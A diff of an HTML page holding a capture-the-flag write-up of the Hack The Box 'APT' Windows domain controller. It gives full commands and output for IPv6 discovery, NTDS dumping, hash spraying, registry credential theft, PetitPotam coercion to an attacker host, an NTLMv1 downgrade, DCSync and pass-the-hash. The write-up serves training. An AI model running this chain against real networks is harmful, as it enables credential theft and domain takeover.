@@ -645,7 +645,7 @@
 
 
 <p><img alt="APT" src="../img/APT_BANNER.png" /></p>
-<h1 id="apt-writeup">APT-WriteUp<a class="headerlink" href="#apt-writeup" title="Permanent link">&para;</a></h1>
+<h1 id="apt-writeup">APT-WriteUp</h1>
 <p>In this Windows Active Directory machine rated <strong>Insane</strong>, we'll compromise a Domain Controller starting from what appears to be a minimal attack surface, only two TCP ports open. The key insight is that the firewall only filters IPv4, leaving IPv6 wide open. From there, we exploit a leaked NTDS backup, perform a hash spray, abuse Remote Registry access, and ultimately weaponize an NTLMv1 downgrade to achieve full domain compromise. You will learn how to:</p>
 <ul>
 <li>Discover hidden IPv6 addresses via DCOM/OXID Resolver (MS-DCOM)</li>
@@ -662,7 +662,7 @@
 <p>🧰 Tools used: <code>nmap</code>, <code>IOXIDResolver.py</code>, <code>smbclient.py</code>, <code>zip2john</code>, <code>john</code>, <code>secretsdump.py</code>, <code>kerbrute</code>, <code>reg.py</code>, <code>evil-winrm</code>, <code>PetitPotam.py</code>, <code>responder</code>, <code>hashcat</code>.</p>
 <p>Let's get started.</p>
 <hr />
-<h2 id="port-scanning">Port Scanning<a class="headerlink" href="#port-scanning" title="Permanent link">&para;</a></h2>
+<h2 id="port-scanning">Port Scanning</h2>
 <p>We started with a full TCP SYN scan across all ports on the target IPv4 address.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>--open<span class="w"> </span>-Pn<span class="w"> </span>-p-<span class="w"> </span>-sS<span class="w"> </span>-n<span class="w"> </span>-vvv<span class="w"> </span><span class="m">10</span>.129.96.60
 <a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
@@ -671,7 +671,7 @@
 <a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="m">135</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">   </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">127</span>
 </code></pre></div>
 <p>Only two ports open, HTTP and MSRPC. This is suspicious for a Windows machine and strongly suggests a firewall is in play.</p>
-<h3 id="service-enumeration">Service Enumeration<a class="headerlink" href="#service-enumeration" title="Permanent link">&para;</a></h3>
+<h3 id="service-enumeration">Service Enumeration</h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nmap<span class="w"> </span>-sVC<span class="w"> </span>-p80,135<span class="w"> </span><span class="m">10</span>.129.96.60
 <a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
 <a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>PORT<span class="w">    </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
@@ -693,12 +693,12 @@
 </code></pre></div>
 <p>SNMP is filtered. Dead end for now.</p>
 <hr />
-<h2 id="discovering-ipv6-via-dcom-ioxidresolver">Discovering IPv6 via DCOM / IOXIDResolver<a class="headerlink" href="#discovering-ipv6-via-dcom-ioxidresolver" title="Permanent link">&para;</a></h2>
+<h2 id="discovering-ipv6-via-dcom-ioxidresolver">Discovering IPv6 via DCOM / IOXIDResolver</h2>
 <p>With only ports 80 and 135 open on IPv4, we know a firewall is blocking standard AD ports (445, 389, 88, etc.). However, <strong>Windows firewalls often forget to filter IPv6</strong>.</p>
 <p>Port 135 always exposes the <strong>IOXIDResolver</strong> interface (<code>99fcfec4-5260-101b-bbcb-00aa0021347a</code>), which is part of the DCOM core. Unlike regular RPC endpoints, IOXIDResolver doesn't register itself in the Endpoint Mapper, it's always available directly on port 135.</p>
-<h4 id="why-doesnt-it-appear-in-rpcdump">Why doesn't it appear in rpcdump?<a class="headerlink" href="#why-doesnt-it-appear-in-rpcdump" title="Permanent link">&para;</a></h4>
+<h4 id="why-doesnt-it-appear-in-rpcdump">Why doesn't it appear in rpcdump?</h4>
 <p>The <code>rpcdump.py</code> tool queries the <strong>Endpoint Mapper (EPM)</strong>, which acts like a directory of registered services. IOXIDResolver is part of the DCOM kernel and never registers there it's always reachable directly.</p>
-<h4 id="how-the-attack-works">How the attack works<a class="headerlink" href="#how-the-attack-works" title="Permanent link">&para;</a></h4>
+<h4 id="how-the-attack-works">How the attack works</h4>
 <p>The <code>ServerAlive2()</code> method of IOXIDResolver is completely unauthenticated and responds with all network interfaces (bindings) of the target, including IPv6 addresses you didn't know existed.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python3<span class="w"> </span>IOXIDResolver.py<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.129.96.60
 <a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
@@ -713,7 +713,7 @@
 <a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>sudo<span class="w"> </span>sh<span class="w"> </span>-c<span class="w"> </span><span class="s1">'echo "dead:beef::d84d:4773:b57f:bc13 APT6-2.htb" &gt;&gt; /etc/hosts'</span>
 </code></pre></div>
 <hr />
-<h2 id="full-port-scan-via-ipv6">Full Port Scan via IPv6<a class="headerlink" href="#full-port-scan-via-ipv6" title="Permanent link">&para;</a></h2>
+<h2 id="full-port-scan-via-ipv6">Full Port Scan via IPv6</h2>
 <p>Now we scan the target over IPv6 using the <code>-6</code> flag:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>--open<span class="w"> </span>-Pn<span class="w"> </span>-p-<span class="w"> </span>-sS<span class="w"> </span>-n<span class="w"> </span>-vvv<span class="w"> </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span>-6
 <a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
@@ -743,7 +743,7 @@
 <a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="m">52410</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
 </code></pre></div>
 <p>All the expected Domain Controller ports are now visible. The IPv4 firewall was blocking everything, but IPv6 was completely unfiltered.</p>
-<h3 id="service-enumeration-over-ipv6">Service Enumeration over IPv6<a class="headerlink" href="#service-enumeration-over-ipv6" title="Permanent link">&para;</a></h3>
+<h3 id="service-enumeration-over-ipv6">Service Enumeration over IPv6</h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>nmap<span class="w"> </span>-sVC<span class="w"> </span>-p53,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49685,52410<span class="w"> </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span>-6
 <a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
 <a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">      </span>VERSION
@@ -827,7 +827,7 @@
 </code></pre></div>
 <p>We're dealing with a <strong>Windows Server 2016</strong> Domain Controller for the domain <code>htb.local</code>. The hostname is <code>APT</code>.</p>
 <hr />
-<h2 id="smb-enumeration-anonymous-share-access">SMB Enumeration — Anonymous Share Access<a class="headerlink" href="#smb-enumeration-anonymous-share-access" title="Permanent link">&para;</a></h2>
+<h2 id="smb-enumeration-anonymous-share-access">SMB Enumeration — Anonymous Share Access</h2>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>htb.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
 <a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">14393</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:APT<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:htb.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>Null<span class="w"> </span>Auth:True<span class="o">)</span>
 <a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>htb.local<span class="se">\:</span>
@@ -849,7 +849,7 @@
 <a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1"># get backup.zip</span>
 </code></pre></div>
 <hr />
-<h2 id="cracking-the-backup-zip">Cracking the Backup ZIP<a class="headerlink" href="#cracking-the-backup-zip" title="Permanent link">&para;</a></h2>
+<h2 id="cracking-the-backup-zip">Cracking the Backup ZIP</h2>
 <p>The ZIP is password-protected. We extract its hash with <code>zip2john</code> and crack it with John the Ripper:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>zip2john<span class="w"> </span>backup.zip<span class="w"> </span>&gt;<span class="w"> </span>backup_hash
 <a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
@@ -885,7 +885,7 @@
 </code></pre></div>
 <p>We have the three files needed to dump the entire domain: <code>ntds.dit</code>, <code>SYSTEM</code>, and <code>SECURITY</code>.</p>
 <hr />
-<h2 id="offline-ntds-dump-with-secretsdumppy">Offline NTDS Dump with secretsdump.py<a class="headerlink" href="#offline-ntds-dump-with-secretsdumppy" title="Permanent link">&para;</a></h2>
+<h2 id="offline-ntds-dump-with-secretsdumppy">Offline NTDS Dump with secretsdump.py</h2>
 <p>With <code>ntds.dit</code> + <code>SYSTEM</code> + <code>SECURITY</code>, we can extract all domain credentials offline without touching the live DC:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>secretsdump.py<span class="w"> </span>-ntds<span class="w"> </span><span class="s2">"Active Directory/ntds.dit"</span><span class="w"> </span>-system<span class="w"> </span>registry/SYSTEM<span class="w"> </span>-security<span class="w"> </span>registry/SECURITY<span class="w"> </span>LOCAL
 <a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
@@ -922,7 +922,7 @@
 </code></pre></div>
 <p>We found a cleartext password <code>&lt;REDACTED&gt;</code> in the LSA secrets, and 1999 domain user hashes. However, this is a <strong>backup from September 2020</strong> — passwords may have changed since then. We need to figure out which users are still valid.</p>
 <hr />
-<h2 id="user-validation-via-kerbrute">User Validation via Kerbrute<a class="headerlink" href="#user-validation-via-kerbrute" title="Permanent link">&para;</a></h2>
+<h2 id="user-validation-via-kerbrute">User Validation via Kerbrute</h2>
 <p>We try a password spray with <code>&lt;REDACTED&gt;</code> first,no luck. Since port 88 (Kerberos) is open, we use <code>kerbrute</code> to validate which users from the dump still exist in the domain:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>./kerbrute_linux_amd64<span class="w"> </span>userenum<span class="w"> </span>-d<span class="w"> </span>htb.local<span class="w"> </span>--dc<span class="w"> </span>apt6.htb<span class="w"> </span>users.txt
 <a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
@@ -932,7 +932,7 @@
 </code></pre></div>
 <p>Only two valid users: <code>Administrator</code> and <code>henry.vinson</code>. The rest of the accounts from the 2020 backup no longer exist.</p>
 <hr />
-<h2 id="ntlm-hash-spray-against-henryvinson">NTLM Hash Spray Against henry.vinson<a class="headerlink" href="#ntlm-hash-spray-against-henryvinson" title="Permanent link">&para;</a></h2>
+<h2 id="ntlm-hash-spray-against-henryvinson">NTLM Hash Spray Against henry.vinson</h2>
 <p>We find henry.vinson's hash from the dump:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>henry.vinson:3647:aad3b435&lt;REDACTED_HASH&gt;:::
 </code></pre></div>
@@ -953,7 +953,7 @@
 </code></pre></div>
 <p>Henry is reusing the NTLM hash of another user from the old dump. We now have valid credentials for him.</p>
 <hr />
-<h2 id="remote-registry-access-with-regpy">Remote Registry Access with reg.py<a class="headerlink" href="#remote-registry-access-with-regpy" title="Permanent link">&para;</a></h2>
+<h2 id="remote-registry-access-with-regpy">Remote Registry Access with reg.py</h2>
 <p>Henry's hash authenticates against Kerberos, but SMB and WinRM both return Access Denied, he doesn't have interactive login rights. However, there's another avenue: <strong>Remote Registry via RPC</strong>.</p>
 <p>Windows administrators often forget to restrict Remote Registry access in GPOs, leaving it open as a way to read persistent configuration. If Henry has ever logged into this machine, his registry hive will be mounted under <code>HKU</code>.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>reg.py<span class="w"> </span>-hashes<span class="w"> </span>:&lt;REDACTED_HASH&gt;<span class="w"> </span>htb.local/henry.vinson@apt6.htb<span class="w"> </span>query<span class="w"> </span>-keyName<span class="w"> </span><span class="s2">"HKU"</span>
@@ -997,7 +997,7 @@
 <p><strong>Pentest tip:</strong> Whenever you have credentials but no shell, look for persistence and configuration storage: SMB shares, LDAP, and the Windows Registry. Third-party management software like this routinely stores credentials in <code>HKCU\Software\&lt;AppName&gt;</code>.</p>
 </blockquote>
 <hr />
-<h2 id="shell-as-henryvinson_adm-and-user-flag">Shell as henry.vinson_adm and user Flag<a class="headerlink" href="#shell-as-henryvinson_adm-and-user-flag" title="Permanent link">&para;</a></h2>
+<h2 id="shell-as-henryvinson_adm-and-user-flag">Shell as henry.vinson_adm and user Flag</h2>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span>apt6.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'henry.vinson_adm'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;REDACTED&gt;'</span>
 <a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>WINRM<span class="w">       </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">5985</span><span class="w">   </span>APT<span class="w">              </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Build<span class="w"> </span><span class="m">14393</span><span class="w"> </span><span class="o">(</span>name:APT<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:htb.local<span class="o">)</span>
 <a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>WINRM<span class="w">       </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">5985</span><span class="w">   </span>APT<span class="w">              </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>htb.local<span class="se">\h</span>enry.vinson_adm:&lt;REDACTED&gt;<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
@@ -1008,8 +1008,8 @@
 <a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>&lt;USER_FLAG&gt;
 </code></pre></div>
 <hr />
-<h2 id="privilege-escalation-ntlmv1-downgrade-attack">Privilege Escalation — NTLMv1 Downgrade Attack<a class="headerlink" href="#privilege-escalation-ntlmv1-downgrade-attack" title="Permanent link">&para;</a></h2>
-<h3 id="finding-the-attack-path-via-powershell-history">Finding the Attack Path via PowerShell History<a class="headerlink" href="#finding-the-attack-path-via-powershell-history" title="Permanent link">&para;</a></h3>
+<h2 id="privilege-escalation-ntlmv1-downgrade-attack">Privilege Escalation — NTLMv1 Downgrade Attack</h2>
+<h3 id="finding-the-attack-path-via-powershell-history">Finding the Attack Path via PowerShell History</h3>
 <p>Once I gained a shell as henry.vinson_adm, I started with basic enumeration to understand my environment.
 <div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
 <a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
@@ -1112,17 +1112,17 @@ While digging through the AppData folder, I found a ConsoleHost_history.txt in t
 <a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="n">PSDrive</span>              <span class="p">:</span> <span class="n">HKLM</span>
 <a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="n">PSProvider</span>           <span class="p">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">Registry</span>
 </code></pre></div>
-<h4 id="why-does-this-matter">Why does this matter?<a class="headerlink" href="#why-does-this-matter" title="Permanent link">&para;</a></h4>
+<h4 id="why-does-this-matter">Why does this matter?</h4>
 <p>NTLMv1 is architecturally broken. It relies on DES with a 56-bit key, meaning any captured NTLMv1 hash can be cracked in seconds via Rainbow Tables (like ntlmv1.com), regardless of how long or complex the password is. In contrast, NTLMv2 implements proper salted hashing, making it significantly harder to crack and impossible to decrypt using pre-computed tables.
 <strong>The Downgrade Logic:</strong> Setting <code>lmcompatibilitylevel = 2</code> tells Windows to send NTLMv1 responses but still accept NTLMv2 if requested by the server. By using Responder, we act as the "server" in this exchange and specifically request NTLMv1. This forces the client to downgrade its authentication to the weakest level, allowing us to capture a hash that is susceptible to rainbow table attacks.</p>
 <p>With NTLMv1 enabled, the attack chain is:
 1. <strong>PetitPotam</strong> — Coerce the Domain Controller to authenticate to our machine via MS-EFSRPC.
 2. <strong>Responder</strong> — Capture the DC's NTLMv1 authentication response.
 3. <strong>Rainbow tables</strong> — Submit the hash to ntlmv1.com for instant decryption, recovering the machine account password or NT hash.</p>
-<h3 id="step-1-configure-responder-with-a-fixed-challenge">Step 1 — Configure Responder with a Fixed Challenge<a class="headerlink" href="#step-1-configure-responder-with-a-fixed-challenge" title="Permanent link">&para;</a></h3>
+<h3 id="step-1-configure-responder-with-a-fixed-challenge">Step 1 — Configure Responder with a Fixed Challenge</h3>
 <p>For the rainbow table attack to work, we need to capture the hash with a <strong>known, fixed challenge</strong>. By default Responder generates a random one per request, which would make rainbow table lookup impossible. We set it to <code>1122334455667788</code> in the config:</p>
 <p><img alt="Responder.conf with Challenge = 1122334455667788" src="../img/APT_0003.png" /></p>
-<h3 id="step-2-force-authentication-with-petitpotam">Step 2 — Force Authentication with PetitPotam<a class="headerlink" href="#step-2-force-authentication-with-petitpotam" title="Permanent link">&para;</a></h3>
+<h3 id="step-2-force-authentication-with-petitpotam">Step 2 — Force Authentication with PetitPotam</h3>
 <p>PetitPotam abuses the MS-EFSRPC protocol (<code>EfsRpcOpenFileRaw</code>) to make a target Windows machine authenticate against an attacker-controlled server — without needing admin rights in many cases:</p>
 <p><div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>python3<span class="w"> </span>PetitPotam.py<span class="w"> </span>-u<span class="w"> </span><span class="s1">'henry.vinson_adm'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;REDACTED&gt;'</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">'htb.local'</span><span class="w"> </span>&lt;ATTACKER_IP&gt;<span class="w"> </span>apt6.htb
 <a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="w">  </span><span class="p">|</span><span class="w"> </span>_<span class="w"> </span><span class="se">\ </span><span class="w">  </span>___<span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="w">     </span><span class="o">(</span>_<span class="o">)</span><span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="w">     </span><span class="p">|</span><span class="w"> </span>_<span class="w"> </span><span class="se">\ </span><span class="w">  </span>___<span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="w">    </span>__<span class="w"> </span>_<span class="w">    </span>_<span class="w"> </span>__
@@ -1163,7 +1163,7 @@ In the other terminal:
 <a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv1<span class="w"> </span>Username<span class="w"> </span>:<span class="w"> </span>HTB<span class="se">\A</span>PT$
 <a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv1<span class="w"> </span>Hash<span class="w">     </span>:<span class="w"> </span>APT$::HTB:&lt;REDACTED_HASH&gt;
 </code></pre></div></p>
-<h3 id="step-3-crack-with-rainbow-tables">Step 3 — Crack with Rainbow Tables<a class="headerlink" href="#step-3-crack-with-rainbow-tables" title="Permanent link">&para;</a></h3>
+<h3 id="step-3-crack-with-rainbow-tables">Step 3 — Crack with Rainbow Tables</h3>
 <p>We tried <code>hashcat</code> with rockyou.txt first and it exhausted the wordlist without success. Machine account passwords are random and complex by design.</p>
 <p>Instead, we use <a href="https://ntlmv1.com/">ntlmv1.com</a>. Since we used the fixed challenge <code>1122334455667788</code>, the site can look up the NT hash directly from precomputed rainbow tables. We submit the <code>NTLMResponse</code> portion and select <code>Net-NTLMv1</code>:</p>
 <p><img alt="ntlmv1.com with the hash loaded and Net-NTLMv1 selected" src="../img/APT_0004.png" /></p>
@@ -1171,7 +1171,7 @@ In the other terminal:
 <p><img alt="ntlmv1.com Tasks showing the cracked NT hash of APT$" src="../img/APT_0005.png" /></p>
 <p>The <strong>NT hash of the <code>APT$</code> machine account</strong> is <code>&lt;REDACTED_HASH&gt;</code>.</p>
 <hr />
-<h2 id="dcsync-as-apt-administrator-hash">DCSync as APT$ — Administrator Hash<a class="headerlink" href="#dcsync-as-apt-administrator-hash" title="Permanent link">&para;</a></h2>
+<h2 id="dcsync-as-apt-administrator-hash">DCSync as APT$ — Administrator Hash</h2>
 <p>Machine accounts in AD have replication privileges. We use <code>APT$</code>'s NT hash to perform a <strong>DCSync</strong> and pull the Administrator's credentials directly:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>secretsdump.py<span class="w"> </span><span class="s1">'htb.local/APT$@apt6.htb'</span><span class="w"> </span>-hashes<span class="w"> </span>:&lt;REDACTED_HASH&gt;<span class="w"> </span>-just-dc-user<span class="w"> </span>Administrator
 <a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>Impacket<span class="w"> </span>v0.13.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
@@ -1186,7 +1186,7 @@ In the other terminal:
 <a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Cleaning<span class="w"> </span>up...
 </code></pre></div>
 <hr />
-<h2 id="shell-as-administrator-root-flag">Shell as Administrator — Root Flag<a class="headerlink" href="#shell-as-administrator-root-flag" title="Permanent link">&para;</a></h2>
+<h2 id="shell-as-administrator-root-flag">Shell as Administrator — Root Flag</h2>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>apt6.htb<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span>&lt;REDACTED_HASH&gt;
 <a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>
 <a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;<span class="w"> </span><span class="nb">type</span><span class="w"> </span>..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
@@ -1273,6 +1273,8 @@ In the other terminal:
     
     
       <script src="../../../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../../../../javascripts/site.js"></script>
       
     
   </body>
